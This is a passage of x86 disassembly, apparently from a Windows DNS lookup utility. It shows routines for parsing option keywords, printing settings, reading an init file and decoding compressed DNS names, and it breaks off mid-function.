  409450:	lea    eax,[ebp-0x108]
  409456:	xor    edx,edx
  409458:	push   eax
  409459:	add    ecx,0x20
  40945c:	inc    edx
  40945d:	push   0xff03
  409462:	call   0x406c8e
  409467:	mov    esi,eax
  409469:	test   esi,esi
  40946b:	je     0x409489
  40946d:	mov    ecx,esi
  40946f:	call   0x40b6bf
  409474:	push   eax
  409475:	lea    eax,[ebp-0x108]
  40947b:	push   eax
  40947c:	push   0x30
  40947e:	push   ebx
  40947f:	call   0x40b328
  409484:	add    esp,0x10
  409487:	jmp    0x4094b3
  409489:	mov    ecx,DWORD PTR ds:0x4122c0
  40948f:	mov    esi,0x411f60
  409494:	push   esi
  409495:	push   0x35
  409497:	pop    edx
  409498:	call   0x40b424
  40949d:	lea    eax,[ebp-0x108]
  4094a3:	mov    edx,esi
  4094a5:	push   eax
  4094a6:	lea    ecx,[ebp-0x308]
  4094ac:	call   0x40904e
  4094b1:	mov    esi,eax
  4094b3:	test   edi,edi
  4094b5:	je     0x4094cb
  4094b7:	push   DWORD PTR ds:0x4122c0
  4094bd:	call   DWORD PTR ds:0x413158
  4094c3:	and    DWORD PTR ds:0x4122c0,0x0
  4094ca:	pop    ecx
  4094cb:	mov    eax,esi
  4094cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4094d0:	pop    edi
  4094d1:	pop    esi
  4094d2:	xor    ecx,ebp
  4094d4:	pop    ebx
  4094d5:	call   0x40cd10
  4094da:	mov    esp,ebp
  4094dc:	pop    ebp
  4094dd:	ret    
  4094de:	int3   
  4094df:	int3   
  4094e0:	int3   
  4094e1:	int3   
  4094e2:	int3   
  4094e3:	mov    edi,edi
  4094e5:	push   ebp
  4094e6:	mov    ebp,esp
  4094e8:	sub    esp,0x108
  4094ee:	mov    eax,ds:0x40e004
  4094f3:	xor    eax,ebp
  4094f5:	mov    DWORD PTR [ebp-0x4],eax
  4094f8:	push   esi
  4094f9:	mov    esi,ecx
  4094fb:	jmp    0x4094fe
  4094fd:	inc    esi
  4094fe:	movsx  eax,BYTE PTR [esi]
  409501:	push   eax
  409502:	call   DWORD PTR ds:0x4130f4
  409508:	pop    ecx
  409509:	test   eax,eax
  40950b:	jne    0x4094fd
  40950d:	push   0x4
  40950f:	push   0x403318
  409514:	push   esi
  409515:	call   DWORD PTR ds:0x4130ec
  40951b:	add    esp,0xc
  40951e:	test   eax,eax
  409520:	jne    0x409528
  409522:	add    esi,0x4
  409525:	jmp    0x409528
  409527:	inc    esi
  409528:	movsx  eax,BYTE PTR [esi]
  40952b:	push   eax
  40952c:	call   DWORD PTR ds:0x4130f4
  409532:	pop    ecx
  409533:	test   eax,eax
  409535:	jne    0x409527
  409537:	cmp    BYTE PTR [esi],0x0
  40953a:	jne    0x40954f
  40953c:	push   0x36
  40953e:	push   0x2
  409540:	call   0x40b328
  409545:	pop    ecx
  409546:	pop    ecx
  409547:	push   0xfffffffd
  409549:	pop    eax
  40954a:	jmp    0x409b3b
  40954f:	push   ebx
  409550:	push   edi
  409551:	push   0x3
  409553:	push   0x403320
  409558:	push   esi
  409559:	call   DWORD PTR ds:0x4130ec
  40955f:	add    esp,0xc
  409562:	test   eax,eax
  409564:	je     0x40957b
  409566:	push   0x3
  409568:	push   0x403324
  40956d:	push   esi
  40956e:	call   DWORD PTR ds:0x4130ec
  409574:	add    esp,0xc
  409577:	test   eax,eax
  409579:	jne    0x409585
  40957b:	call   0x409c33
  409580:	jmp    0x409b37
  409585:	push   0x2
  409587:	pop    edi
  409588:	push   edi
  409589:	push   0x403328
  40958e:	push   esi
  40958f:	call   DWORD PTR ds:0x4130ec
  409595:	add    esp,0xc
  409598:	test   eax,eax
  40959a:	jne    0x4095ab
  40959c:	or     DWORD PTR ds:0x40e128,0x80000002
  4095a6:	jmp    0x409b37
  4095ab:	push   0x4
  4095ad:	push   0x40332c
  4095b2:	push   esi
  4095b3:	call   DWORD PTR ds:0x4130ec
  4095b9:	add    esp,0xc
  4095bc:	test   eax,eax
  4095be:	jne    0x4095db
  4095c0:	and    DWORD PTR ds:0x40e128,0x7fffffff
  4095ca:	push   0x403334
  4095cf:	call   DWORD PTR ds:0x413198
  4095d5:	pop    ecx
  4095d6:	jmp    0x409b37
  4095db:	push   0x3
  4095dd:	push   0x40335c
  4095e2:	push   esi
  4095e3:	call   DWORD PTR ds:0x4130ec
  4095e9:	add    esp,0xc
  4095ec:	test   eax,eax
  4095ee:	jne    0x4095ff
  4095f0:	or     DWORD PTR ds:0x40e128,0x80
  4095fa:	jmp    0x409b37
  4095ff:	push   0x5
  409601:	pop    ebx
  409602:	push   ebx
  409603:	push   0x403360
  409608:	push   esi
  409609:	call   DWORD PTR ds:0x4130ec
  40960f:	add    esp,0xc
  409612:	test   eax,eax
  409614:	jne    0x409625
  409616:	and    DWORD PTR ds:0x40e128,0xffffff7f
  409620:	jmp    0x409b37
  409625:	push   edi
  409626:	push   0x403368
  40962b:	push   esi
  40962c:	call   DWORD PTR ds:0x4130ec
  409632:	add    esp,0xc
  409635:	test   eax,eax
  409637:	jne    0x409670
  409639:	push   0x3d
  40963b:	push   esi
  40963c:	call   DWORD PTR ds:0x4130f0
  409642:	pop    ecx
  409643:	pop    ecx
  409644:	test   eax,eax
  409646:	je     0x409b37
  40964c:	push   0x3200
  409651:	push   0x40e15a
  409656:	inc    eax
  409657:	push   0x40336c
  40965c:	push   eax
  40965d:	call   DWORD PTR ds:0x4131a8
  409663:	add    esp,0x10
  409666:	call   0x409b4f
  40966b:	jmp    0x409b37
  409670:	push   0x1
  409672:	push   0x403370
  409677:	push   esi
  409678:	call   DWORD PTR ds:0x4130ec
  40967e:	add    esp,0xc
  409681:	test   eax,eax
  409683:	jne    0x409690
  409685:	or     DWORD PTR ds:0x40e128,edi
  40968b:	jmp    0x409b37
  409690:	push   ebx
  409691:	push   0x403374
  409696:	push   esi
  409697:	call   DWORD PTR ds:0x4130ec
  40969d:	add    esp,0xc
  4096a0:	test   eax,eax
  4096a2:	jne    0x4096b3
  4096a4:	and    DWORD PTR ds:0x40e128,0x7ffffffd
  4096ae:	jmp    0x409b37
  4096b3:	push   edi
  4096b4:	push   0x40337c
  4096b9:	push   esi
  4096ba:	call   DWORD PTR ds:0x4130ec
  4096c0:	add    esp,0xc
  4096c3:	test   eax,eax
  4096c5:	jne    0x4096d3
  4096c7:	or     DWORD PTR ds:0x40e128,0x20
  4096ce:	jmp    0x409b37
  4096d3:	push   0x4
  4096d5:	push   0x403380
  4096da:	push   esi
  4096db:	call   DWORD PTR ds:0x4130ec
  4096e1:	add    esp,0xc
  4096e4:	test   eax,eax
  4096e6:	jne    0x4096f4
  4096e8:	and    DWORD PTR ds:0x40e128,0xffffffdf
  4096ef:	jmp    0x409b37
  4096f4:	push   edi
  4096f5:	push   0x403388
  4096fa:	push   esi
  4096fb:	call   DWORD PTR ds:0x4130ec
  409701:	add    esp,0xc
  409704:	test   eax,eax
  409706:	jne    0x40972a
  409708:	push   0x3d
  40970a:	push   esi
  40970b:	call   DWORD PTR ds:0x4130f0
  409711:	pop    ecx
  409712:	pop    ecx
  409713:	test   eax,eax
  409715:	je     0x409b37
  40971b:	push   0x411430
  409720:	push   0x40338c
  409725:	jmp    0x409a6a
  40972a:	push   0x1
  40972c:	push   0x403390
  409731:	push   esi
  409732:	call   DWORD PTR ds:0x4130ec
  409738:	add    esp,0xc
  40973b:	test   eax,eax
  40973d:	je     0x409acb
  409743:	push   edi
  409744:	push   0x403394
  409749:	push   esi
  40974a:	call   DWORD PTR ds:0x4130ec
  409750:	add    esp,0xc
  409753:	test   eax,eax
  409755:	je     0x409acb
  40975b:	push   edi
  40975c:	push   0x403398
  409761:	push   esi
  409762:	call   DWORD PTR ds:0x4130ec
  409768:	add    esp,0xc
  40976b:	test   eax,eax
  40976d:	jne    0x4097d7
  40976f:	push   0x3d
  409771:	push   esi
  409772:	call   DWORD PTR ds:0x4130f0
  409778:	mov    edx,eax
  40977a:	pop    ecx
  40977b:	pop    ecx
  40977c:	test   edx,edx
  40977e:	je     0x409b37
  409784:	mov    ecx,edx
  409786:	lea    esi,[ecx+0x1]
  409789:	mov    al,BYTE PTR [ecx]
  40978b:	inc    ecx
  40978c:	test   al,al
  40978e:	jne    0x409789
  409790:	sub    ecx,esi
  409792:	mov    eax,0x100
  409797:	cmp    ecx,eax
  409799:	jae    0x409af3
  40979f:	push   eax
  4097a0:	lea    eax,[ebp-0x104]
  4097a6:	push   eax
  4097a7:	lea    eax,[edx+0x1]
  4097aa:	push   0x40336c
  4097af:	push   eax
  4097b0:	call   DWORD PTR ds:0x4131a8
  4097b6:	add    esp,0x10
  4097b9:	cmp    eax,0x1
  4097bc:	jne    0x409b37
  4097c2:	lea    ecx,[ebp-0x104]
  4097c8:	call   0x40b750
  4097cd:	mov    ds:0x40e118,eax
  4097d2:	jmp    0x409b37
  4097d7:	push   0x3
  4097d9:	push   0x40339c
  4097de:	push   esi
  4097df:	call   DWORD PTR ds:0x4130ec
  4097e5:	add    esp,0xc
  4097e8:	test   eax,eax
  4097ea:	jne    0x4097f8
  4097ec:	or     DWORD PTR ds:0x40e128,0x40
  4097f3:	jmp    0x409b37
  4097f8:	push   ebx
  4097f9:	push   0x4033a0
  4097fe:	push   esi
  4097ff:	call   DWORD PTR ds:0x4130ec
  409805:	add    esp,0xc
  409808:	test   eax,eax
  40980a:	jne    0x409818
  40980c:	and    DWORD PTR ds:0x40e128,0xffffffbf
  409813:	jmp    0x409b37
  409818:	push   0x3
  40981a:	push   0x4033a8
  40981f:	push   esi
  409820:	call   DWORD PTR ds:0x4130ec
  409826:	add    esp,0xc
  409829:	test   eax,eax
  40982b:	jne    0x409878
  40982d:	push   0x3d
  40982f:	push   esi
  409830:	call   DWORD PTR ds:0x4130f0
  409836:	pop    ecx
  409837:	pop    ecx
  409838:	test   eax,eax
  40983a:	je     0x409b37
  409840:	lea    ecx,[ebp-0x108]
  409846:	inc    eax
  409847:	push   ecx
  409848:	push   0x4033ac
  40984d:	push   eax
  40984e:	call   DWORD PTR ds:0x4131a8
  409854:	add    esp,0xc
  409857:	cmp    eax,0x1
  40985a:	jne    0x409b37
  409860:	mov    eax,DWORD PTR [ebp-0x108]
  409866:	test   eax,eax
  409868:	js     0x409b37
  40986e:	mov    ds:0x40e124,eax
  409873:	jmp    0x409b37
  409878:	push   edi
  409879:	push   0x4033b0
  40987e:	push   esi
  40987f:	call   DWORD PTR ds:0x4130ec
  409885:	add    esp,0xc
  409888:	test   eax,eax
  40988a:	jne    0x4098d9
  40988c:	push   0x3d
  40988e:	push   esi
  40988f:	call   DWORD PTR ds:0x4130f0
  409895:	mov    edx,eax
  409897:	pop    ecx
  409898:	pop    ecx
  409899:	test   edx,edx
  40989b:	je     0x409b37
  4098a1:	mov    ecx,edx
  4098a3:	lea    esi,[ecx+0x1]
  4098a6:	mov    al,BYTE PTR [ecx]
  4098a8:	inc    ecx
  4098a9:	test   al,al
  4098ab:	jne    0x4098a6
  4098ad:	sub    ecx,esi
  4098af:	mov    eax,0x100
  4098b4:	cmp    ecx,eax
  4098b6:	jae    0x409af3
  4098bc:	push   eax
  4098bd:	push   0x40e018
  4098c2:	lea    eax,[edx+0x1]
  4098c5:	push   0x40336c
  4098ca:	push   eax
  4098cb:	call   DWORD PTR ds:0x4131a8
  4098d1:	add    esp,0x10
  4098d4:	jmp    0x409b37
  4098d9:	push   0x3
  4098db:	push   0x4033b4
  4098e0:	push   esi
  4098e1:	call   DWORD PTR ds:0x4130ec
  4098e7:	add    esp,0xc
  4098ea:	test   eax,eax
  4098ec:	jne    0x4098fd
  4098ee:	or     DWORD PTR ds:0x40e128,0x200
  4098f8:	jmp    0x409b37
  4098fd:	push   ebx
  4098fe:	push   0x4033b8
  409903:	push   esi
  409904:	call   DWORD PTR ds:0x4130ec
  40990a:	add    esp,0xc
  40990d:	test   eax,eax
  40990f:	jne    0x409920
  409911:	and    DWORD PTR ds:0x40e128,0xfffffdff
  40991b:	jmp    0x409b37
  409920:	push   ebx
  409921:	push   0x4033c0
  409926:	push   esi
  409927:	call   DWORD PTR ds:0x4130ec
  40992d:	add    esp,0xc
  409930:	test   eax,eax
  409932:	jne    0x409954
  409934:	push   0x3d
  409936:	push   esi
  409937:	call   DWORD PTR ds:0x4130f0
  40993d:	pop    ecx
  40993e:	pop    ecx
  40993f:	test   eax,eax
  409941:	je     0x409b37
  409947:	lea    ecx,[eax+0x1]
  40994a:	call   0x409bac
  40994f:	jmp    0x409b37
  409954:	push   edi
  409955:	push   0x4033c8
  40995a:	push   esi
  40995b:	call   DWORD PTR ds:0x4130ec
  409961:	add    esp,0xc
  409964:	test   eax,eax
  409966:	jne    0x4099b3
  409968:	push   0x3d
  40996a:	push   esi
  40996b:	call   DWORD PTR ds:0x4130f0
  409971:	pop    ecx
  409972:	pop    ecx
  409973:	test   eax,eax
  409975:	je     0x409b37
  40997b:	lea    ecx,[ebp-0x108]
  409981:	inc    eax
  409982:	push   ecx
  409983:	push   0x4033ac
  409988:	push   eax
  409989:	call   DWORD PTR ds:0x4131a8
  40998f:	add    esp,0xc
  409992:	cmp    eax,0x1
  409995:	jne    0x409b37
  40999b:	mov    eax,DWORD PTR [ebp-0x108]
  4099a1:	test   eax,eax
  4099a3:	js     0x409b37
  4099a9:	mov    ds:0x40e120,eax
  4099ae:	jmp    0x409b37
  4099b3:	push   0x1
  4099b5:	push   0x4033cc
  4099ba:	push   esi
  4099bb:	call   DWORD PTR ds:0x4130ec
  4099c1:	add    esp,0xc
  4099c4:	test   eax,eax
  4099c6:	jne    0x4099d4
  4099c8:	or     DWORD PTR ds:0x40e128,0x8
  4099cf:	jmp    0x409b37
  4099d4:	push   0x3
  4099d6:	push   0x4033d0
  4099db:	push   esi
  4099dc:	call   DWORD PTR ds:0x4130ec
  4099e2:	add    esp,0xc
  4099e5:	test   eax,eax
  4099e7:	jne    0x4099f5
  4099e9:	and    DWORD PTR ds:0x40e128,0xfffffff7
  4099f0:	jmp    0x409b37
  4099f5:	push   ebx
  4099f6:	push   0x4033d4
  4099fb:	push   esi
  4099fc:	call   DWORD PTR ds:0x41311c
  409a02:	add    esp,0xc
  409a05:	test   eax,eax
  409a07:	jne    0x409a18
  409a09:	mov    DWORD PTR ds:0x411428,0x1
  409a13:	jmp    0x409b37
  409a18:	push   0x4
  409a1a:	push   0x4033dc
  409a1f:	push   esi
  409a20:	call   DWORD PTR ds:0x41311c
  409a26:	add    esp,0xc
  409a29:	test   eax,eax
  409a2b:	jne    0x409a38
  409a2d:	and    DWORD PTR ds:0x411428,eax
  409a33:	jmp    0x409b37
  409a38:	push   0x4
  409a3a:	push   0x4033e4
  409a3f:	push   esi
  409a40:	call   DWORD PTR ds:0x41311c
  409a46:	add    esp,0xc
  409a49:	test   eax,eax
  409a4b:	jne    0x409a7a
  409a4d:	push   0x3d
  409a4f:	push   esi
  409a50:	call   DWORD PTR ds:0x4130f0
  409a56:	pop    ecx
  409a57:	pop    ecx
  409a58:	test   eax,eax
  409a5a:	je     0x409b37
  409a60:	push   0x41142c
  409a65:	push   0x4033ac
  409a6a:	inc    eax
  409a6b:	push   eax
  409a6c:	call   DWORD PTR ds:0x4131a8
  409a72:	add    esp,0xc
  409a75:	jmp    0x409b37
  409a7a:	push   ebx
  409a7b:	push   0x4033ec
  409a80:	push   esi
  409a81:	call   DWORD PTR ds:0x41311c
  409a87:	add    esp,0xc
  409a8a:	test   eax,eax
  409a8c:	jne    0x409a9d
  409a8e:	or     DWORD PTR ds:0x40e128,0x4000
  409a98:	jmp    0x409b37
  409a9d:	push   ebx
  409a9e:	push   0x4033f4
  409aa3:	push   esi
  409aa4:	call   DWORD PTR ds:0x41311c
  409aaa:	add    esp,0xc
  409aad:	test   eax,eax
  409aaf:	jne    0x409abd
  409ab1:	and    DWORD PTR ds:0x40e128,0xffffbfff
  409abb:	jmp    0x409b37
  409abd:	push   esi
  409abe:	push   0x37
  409ac0:	push   edi
  409ac1:	call   0x40b328
  409ac6:	add    esp,0xc
  409ac9:	jmp    0x409afd
  409acb:	push   0x3d
  409acd:	push   esi
  409ace:	call   DWORD PTR ds:0x4130f0
  409ad4:	mov    edx,eax
  409ad6:	pop    ecx
  409ad7:	pop    ecx
  409ad8:	test   edx,edx
  409ada:	je     0x409b37
  409adc:	mov    ecx,edx
  409ade:	lea    esi,[ecx+0x1]
  409ae1:	mov    al,BYTE PTR [ecx]
  409ae3:	inc    ecx
  409ae4:	test   al,al
  409ae6:	jne    0x409ae1
  409ae8:	sub    ecx,esi
  409aea:	mov    eax,0x100
  409aef:	cmp    ecx,eax
  409af1:	jb     0x409b02
  409af3:	push   0x2f
  409af5:	push   edi
  409af6:	call   0x40b328
  409afb:	pop    ecx
  409afc:	pop    ecx
  409afd:	push   0xfffffffd
  409aff:	pop    eax
  409b00:	jmp    0x409b39
  409b02:	push   eax
  409b03:	lea    eax,[ebp-0x104]
  409b09:	push   eax
  409b0a:	lea    eax,[edx+0x1]
  409b0d:	push   0x40336c
  409b12:	push   eax
  409b13:	call   DWORD PTR ds:0x4131a8
  409b19:	add    esp,0x10
  409b1c:	cmp    eax,0x1
  409b1f:	jne    0x409b37
  409b21:	mov    edx,DWORD PTR ds:0x40e11c
  409b27:	lea    ecx,[ebp-0x104]
  409b2d:	call   0x40b7e6
  409b32:	mov    ds:0x40e11c,eax
  409b37:	xor    eax,eax
  409b39:	pop    edi
  409b3a:	pop    ebx
  409b3b:	mov    ecx,DWORD PTR [ebp-0x4]
  409b3e:	xor    ecx,ebp
  409b40:	pop    esi
  409b41:	call   0x40cd10
  409b46:	mov    esp,ebp
  409b48:	pop    ebp
  409b49:	ret    
  409b4a:	int3   
  409b4b:	int3   
  409b4c:	int3   
  409b4d:	int3   
  409b4e:	int3   
  409b4f:	mov    cl,BYTE PTR ds:0x40e15a
  409b55:	mov    eax,0x40e15a
  409b5a:	push   esi
  409b5b:	push   edi
  409b5c:	mov    ds:0x41135c,eax
  409b61:	mov    edi,0x411360
  409b66:	mov    edx,eax
  409b68:	xor    esi,esi
  409b6a:	jmp    0x409b75
  409b6c:	cmp    cl,0x2e
  409b6f:	jne    0x409b72
  409b71:	inc    esi
  409b72:	inc    edx
  409b73:	mov    cl,BYTE PTR [edx]
  409b75:	test   cl,cl
  409b77:	jne    0x409b6c
  409b79:	jmp    0x409b95
  409b7b:	cmp    edi,0x411368
  409b81:	jae    0x409b9a
  409b83:	push   0x2e
  409b85:	push   eax
  409b86:	call   DWORD PTR ds:0x4130f0
  409b8c:	inc    eax
  409b8d:	pop    ecx
  409b8e:	mov    DWORD PTR [edi],eax
  409b90:	add    edi,0x4
  409b93:	pop    ecx
  409b94:	dec    esi
  409b95:	cmp    esi,0x2
  409b98:	jge    0x409b7b
  409b9a:	and    DWORD PTR [edi],0x0
  409b9d:	or     DWORD PTR ds:0x40e128,0x1
  409ba4:	pop    edi
  409ba5:	pop    esi
  409ba6:	ret    
  409ba7:	int3   
  409ba8:	int3   
  409ba9:	int3   
  409baa:	int3   
  409bab:	int3   
  409bac:	mov    edi,edi
  409bae:	push   ebx
  409baf:	push   esi
  409bb0:	push   edi
  409bb1:	push   0x31ff
  409bb6:	push   ecx
  409bb7:	push   0x3200
  409bbc:	mov    esi,0x40e15a
  409bc1:	push   esi
  409bc2:	call   DWORD PTR ds:0x41310c
  409bc8:	push   0xa
  409bca:	push   esi
  409bcb:	call   DWORD PTR ds:0x4130f0
  409bd1:	add    esp,0x18
  409bd4:	xor    ebx,ebx
  409bd6:	test   eax,eax
  409bd8:	je     0x409bdc
  409bda:	mov    BYTE PTR [eax],bl
  409bdc:	mov    eax,ebx
  409bde:	mov    DWORD PTR ds:0x41135c,esi
  409be4:	mov    edi,0x411360
  409be9:	cmp    BYTE PTR ds:0x40e15a,al
  409bef:	je     0x409c15
  409bf1:	cmp    edi,0x411424
  409bf7:	jae    0x409c15
  409bf9:	cmp    BYTE PTR [esi],0x2f
  409bfc:	jne    0x409c05
  409bfe:	xor    eax,eax
  409c00:	mov    BYTE PTR [esi],bl
  409c02:	inc    eax
  409c03:	jmp    0x409c10
  409c05:	test   eax,eax
  409c07:	je     0x409c10
  409c09:	mov    DWORD PTR [edi],esi
  409c0b:	mov    eax,ebx
  409c0d:	add    edi,0x4
  409c10:	inc    esi
  409c11:	cmp    BYTE PTR [esi],bl
  409c13:	jne    0x409bf1
  409c15:	push   0x2f
  409c17:	push   DWORD PTR [edi-0x4]
  409c1a:	call   DWORD PTR ds:0x4130f0
  409c20:	pop    ecx
  409c21:	pop    ecx
  409c22:	test   eax,eax
  409c24:	je     0x409c28
  409c26:	mov    BYTE PTR [eax],bl
  409c28:	mov    DWORD PTR [edi],ebx
  409c2a:	pop    edi
  409c2b:	pop    esi
  409c2c:	pop    ebx
  409c2d:	ret    
  409c2e:	int3   
  409c2f:	int3   
  409c30:	int3   
  409c31:	int3   
  409c32:	int3   
  409c33:	mov    edi,edi
  409c35:	push   ebp
  409c36:	mov    ebp,esp
  409c38:	sub    esp,0x14
  409c3b:	push   DWORD PTR ds:0x411bf4
  409c41:	push   0x1
  409c43:	call   0x40d391
  409c48:	pop    ecx
  409c49:	push   0x2b
  409c4b:	pop    edx
  409c4c:	mov    ecx,eax
  409c4e:	call   0x40b424
  409c53:	cmp    DWORD PTR ds:0x411bfc,0x0
  409c5a:	je     0x409c73
  409c5c:	push   0x4122b0
  409c61:	push   0x1
  409c63:	call   0x40d391
  409c68:	pop    ecx
  409c69:	push   0x23
  409c6b:	pop    edx
  409c6c:	mov    ecx,eax
  409c6e:	call   0x40b424
  409c73:	cmp    DWORD PTR ds:0x411428,0x0
  409c7a:	mov    edx,0x403400
  409c7f:	push   esi
  409c80:	mov    esi,0x402c32
  409c85:	mov    ecx,esi
  409c87:	jne    0x409c8b
  409c89:	mov    ecx,edx
  409c8b:	mov    eax,ds:0x40e128
  409c90:	mov    DWORD PTR [ebp-0x4],esi
  409c93:	test   al,0x20
  409c95:	jne    0x409c9a
  409c97:	mov    DWORD PTR [ebp-0x4],edx
  409c9a:	mov    DWORD PTR [ebp-0x8],esi
  409c9d:	test   al,0x8
  409c9f:	jne    0x409ca4
  409ca1:	mov    DWORD PTR [ebp-0x8],edx
  409ca4:	mov    DWORD PTR [ebp-0xc],esi
  409ca7:	test   eax,eax
  409ca9:	js     0x409cae
  409cab:	mov    DWORD PTR [ebp-0xc],edx
  409cae:	mov    DWORD PTR [ebp-0x10],esi
  409cb1:	test   al,0x40
  409cb3:	jne    0x409cb8
  409cb5:	mov    DWORD PTR [ebp-0x10],edx
  409cb8:	mov    DWORD PTR [ebp-0x14],esi
  409cbb:	test   eax,0x200
  409cc0:	jne    0x409cc5
  409cc2:	mov    DWORD PTR [ebp-0x14],edx
  409cc5:	push   edi
  409cc6:	mov    edi,esi
  409cc8:	test   al,al
  409cca:	js     0x409cce
  409ccc:	mov    edi,edx
  409cce:	test   al,0x2
  409cd0:	jne    0x409cd4
  409cd2:	mov    esi,edx
  409cd4:	push   DWORD PTR ds:0x41142c
  409cda:	push   ecx
  409cdb:	mov    ecx,DWORD PTR ds:0x40e118
  409ce1:	push   0x40e15a
  409ce6:	push   0x40e018
  409ceb:	push   DWORD PTR ds:0x40e124
  409cf1:	push   DWORD PTR ds:0x40e120
  409cf7:	call   0x40a1a5
  409cfc:	mov    ecx,DWORD PTR ds:0x40e11c
  409d02:	push   eax
  409d03:	call   0x40b8af
  409d08:	push   eax
  409d09:	movzx  eax,WORD PTR ds:0x411430
  409d10:	push   eax
  409d11:	push   DWORD PTR [ebp-0x4]
  409d14:	push   DWORD PTR [ebp-0x8]
  409d17:	push   DWORD PTR [ebp-0xc]
  409d1a:	push   DWORD PTR [ebp-0x10]
  409d1d:	push   DWORD PTR [ebp-0x14]
  409d20:	push   edi
  409d21:	push   esi
  409d22:	push   0x63
  409d24:	push   0x1
  409d26:	call   0x40b328
  409d2b:	push   DWORD PTR ds:0x41135c
  409d31:	push   0x403404
  409d36:	call   DWORD PTR ds:0x413198
  409d3c:	mov    eax,ds:0x411360
  409d41:	add    esp,0x50
  409d44:	mov    esi,0x411360
  409d49:	pop    edi
  409d4a:	jmp    0x409d62
  409d4c:	push   eax
  409d4d:	push   0x2f
  409d4f:	push   0x403414
  409d54:	call   DWORD PTR ds:0x413198
  409d5a:	lea    esi,[esi+0x4]
  409d5d:	add    esp,0xc
  409d60:	mov    eax,DWORD PTR [esi]
  409d62:	test   eax,eax
  409d64:	jne    0x409d4c
  409d66:	push   0xa
  409d68:	call   DWORD PTR ds:0x413168
  409d6e:	push   0xa
  409d70:	call   DWORD PTR ds:0x413168
  409d76:	pop    ecx
  409d77:	pop    ecx
  409d78:	pop    esi
  409d79:	mov    esp,ebp
  409d7b:	pop    ebp
  409d7c:	ret    
  409d7d:	int3   
  409d7e:	int3   
  409d7f:	int3   
  409d80:	int3   
  409d81:	int3   
  409d82:	mov    edi,edi
  409d84:	push   ebp
  409d85:	mov    ebp,esp
  409d87:	sub    esp,0x108
  409d8d:	mov    eax,ds:0x40e004
  409d92:	xor    eax,ebp
  409d94:	mov    DWORD PTR [ebp-0x4],eax
  409d97:	push   0x40341c
  409d9c:	call   DWORD PTR ds:0x413108
  409da2:	pop    ecx
  409da3:	test   eax,eax
  409da5:	je     0x409e34
  409dab:	push   esi
  409dac:	push   edi
  409dad:	push   eax
  409dae:	mov    edi,0x101
  409db3:	lea    eax,[ebp-0x108]
  409db9:	push   edi
  409dba:	push   eax
  409dbb:	call   DWORD PTR ds:0x413130
  409dc1:	push   0x403424
  409dc6:	lea    eax,[ebp-0x108]
  409dcc:	push   edi
  409dcd:	push   eax
  409dce:	call   DWORD PTR ds:0x41312c
  409dd4:	lea    eax,[ebp-0x108]
  409dda:	push   0x403434
  409ddf:	push   eax
  409de0:	call   DWORD PTR ds:0x413104
  409de6:	mov    esi,eax
  409de8:	add    esp,0x20
  409deb:	test   esi,esi
  409ded:	je     0x409e32
  409def:	jmp    0x409e14
  409df1:	lea    eax,[ebp-0x108]
  409df7:	push   0xa
  409df9:	push   eax
  409dfa:	call   DWORD PTR ds:0x4130f0
  409e00:	pop    ecx
  409e01:	pop    ecx
  409e02:	test   eax,eax
  409e04:	je     0x409e09
  409e06:	mov    BYTE PTR [eax],0x0
  409e09:	lea    ecx,[ebp-0x108]
  409e0f:	call   0x4094e3
  409e14:	push   esi
  409e15:	lea    eax,[ebp-0x108]
  409e1b:	push   edi
  409e1c:	push   eax
  409e1d:	call   DWORD PTR ds:0x4130fc
  409e23:	add    esp,0xc
  409e26:	test   eax,eax
  409e28:	jne    0x409df1
  409e2a:	push   esi
  409e2b:	call   DWORD PTR ds:0x413158
  409e31:	pop    ecx
  409e32:	pop    edi
  409e33:	pop    esi
  409e34:	mov    ecx,DWORD PTR [ebp-0x4]
  409e37:	xor    ecx,ebp
  409e39:	call   0x40cd10
  409e3e:	mov    esp,ebp
  409e40:	pop    ebp
  409e41:	ret    
  409e42:	int3   
  409e43:	int3   
  409e44:	int3   
  409e45:	int3   
  409e46:	int3   
  409e47:	mov    edi,edi
  409e49:	push   ebp
  409e4a:	mov    ebp,esp
  409e4c:	sub    esp,0x10
  409e4f:	mov    eax,DWORD PTR [ebp+0x10]
  409e52:	push   ebx
  409e53:	push   esi
  409e54:	push   edi
  409e55:	mov    edi,DWORD PTR [ebp+0xc]
  409e58:	or     esi,0xffffffff
  409e5b:	add    eax,edi
  409e5d:	mov    DWORD PTR [ebp-0x8],edx
  409e60:	mov    edx,DWORD PTR [ebp+0x8]
  409e63:	xor    ebx,ebx
  409e65:	mov    DWORD PTR [ebp-0x4],eax
  409e68:	mov    eax,edx
  409e6a:	mov    DWORD PTR [ebp-0xc],ecx
  409e6d:	movzx  ecx,BYTE PTR [eax]
  409e70:	test   ecx,ecx
  409e72:	je     0x409f21
  409e78:	mov    eax,ecx
  409e7a:	inc    edx
  409e7b:	and    eax,0xc0
  409e80:	je     0x409ec1
  409e82:	cmp    eax,0xc0
  409e87:	jne    0x409ebc
  409e89:	test   esi,esi
  409e8b:	jns    0x409e93
  409e8d:	mov    esi,edx
  409e8f:	sub    esi,DWORD PTR [ebp+0x8]
  409e92:	inc    esi
  409e93:	cmp    edx,DWORD PTR [ebp-0x8]
  409e96:	jae    0x409ebc
  409e98:	movzx  edx,BYTE PTR [edx]
  409e9b:	and    ecx,0x3f
  409e9e:	shl    ecx,0x8
  409ea1:	or     edx,ecx
  409ea3:	add    edx,DWORD PTR [ebp-0xc]
  409ea6:	cmp    edx,DWORD PTR [ebp-0xc]
  409ea9:	jb     0x409ebc
  409eab:	mov    eax,DWORD PTR [ebp-0x8]
  409eae:	cmp    edx,eax
  409eb0:	jae    0x409ebc
  409eb2:	sub    eax,DWORD PTR [ebp-0xc]
  409eb5:	add    ebx,0x2
  409eb8:	cmp    ebx,eax
  409eba:	jl     0x409f13
  409ebc:	or     eax,0xffffffff
  409ebf:	jmp    0x409f2f
  409ec1:	cmp    edi,DWORD PTR [ebp+0xc]
  409ec4:	je     0x409ecf
  409ec6:	cmp    edi,DWORD PTR [ebp-0x4]
  409ec9:	jae    0x409ebc
  409ecb:	mov    BYTE PTR [edi],0x2e
  409ece:	inc    edi
  409ecf:	lea    eax,[ecx+edi*1]
  409ed2:	cmp    eax,DWORD PTR [ebp-0x4]
  409ed5:	jae    0x409ebc
  409ed7:	inc    ebx
  409ed8:	add    ebx,ecx
  409eda:	sub    ecx,0x1
  409edd:	mov    DWORD PTR [ebp-0x10],ebx
  409ee0:	js     0x409f13
  409ee2:	mov    eax,DWORD PTR [ebp-0x4]
  409ee5:	movzx  ebx,BYTE PTR [edx]
  409ee8:	inc    edx
  409ee9:	cmp    ebx,0x2e
  409eec:	jne    0x409eff
